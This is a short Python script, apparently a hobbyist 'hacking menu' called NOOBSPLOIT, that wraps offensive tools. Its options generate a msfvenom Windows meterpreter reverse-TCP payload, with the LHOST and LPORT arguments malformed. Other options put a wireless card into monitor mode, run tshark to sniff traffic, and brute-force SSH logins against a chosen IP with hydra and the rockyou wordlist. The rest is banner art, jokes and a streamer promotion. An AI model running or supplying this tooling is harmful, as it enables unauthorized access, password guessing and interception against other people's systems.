import os
import time
print("""

  _   _  ____   ____  ____   _____ _____  _      ____ _____ _______
 | \ | |/ __ \ / __ \|  _ \ / ____|  __ \| |    / __ \_   _|__   __|
 |  \| | |  | | |  | | |_) | (___ | |__) | |   | |  | || |    | |
 | . ` | |  | | |  | |  _ < \___ \|  ___/| |   | |  | || |    | |
 | |\  | |__| | |__| | |_) |____) | |    | |___| |__| || |_   | |
 |_| \_|\____/ \____/|____/|_____/|_|    |______\____/_____|  |_|

        Author: manjoos
        Copyright: N/A
        do i care if you copy this shit code?:

""")
time.sleep(1.5)
print("""
        no, i dont
""")
print("""
[1] Generate Metasploit Payload
[2] Put wlan0 into monitor mode
[3] Hack the Wifi/ sniff http traffic
[4] Cool hacker Screen
[5] Brute Force SSH
[6] Ten Big Men
""")
enter = int(input("Enter a number: "))

if enter == 1:
        half = input("Enter your IP address: ")
        woot = input("Enter the port you want to listen on: ")
        one = input("Where do you want your payload to go?: ")
        os.chdir(one)
        print("LOADING...")
        time.sleep(1)
        print("LOADING...")
        time.sleep(1)
        space = (" ")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp "+half+space+woot+space+("-o payload.exe"))
        print("[*]DONE--------feel free to change the name :)")

if enter == 2:
    os.system("airmon-ng wlan0 start")
    time.sleep(1)
    print("im not telling you how to get out of monitor mode :)")
    time.sleep(1)
    print("have fun learning")
    time.sleep(1)

if enter == 3:
    os.system("tshark")
#install tshark
if enter == 4:
    os.system("cmatrix")
#install cmatrix
if enter == 5:
    lol = input("Enter IP address you want to brute force: ")
    lol2 = input("Enter the User of the SSH: ")
    space = (" ")
    os.system("hydra -l "+lol2+" -P rockyou-20.txt ssh://"+lol+" -t 4")
#provide rockyou.txt
if enter == 6:
    print("""
⠀     (\__/)
   ⠀  (•ㅅ•) Go follow jschlatt @
　＿ノ ヽ ノ＼__ https://www.twitch.tv/jschlatt
/　`/ ⌒Ｙ⌒ Ｙ　ヽ https://www.youtube.com/channel/UCzj25NxFjI5jJM8StIBOvPA
( 　(三ヽ人　 /　|
|　ﾉ⌒＼ ￣￣ヽ　ノ   
ヽ＿＿＿＞､＿_／
　　 ｜( 王 ﾉ〈
　　 /ﾐ`ー―彡\
""")
time.sleep(3)
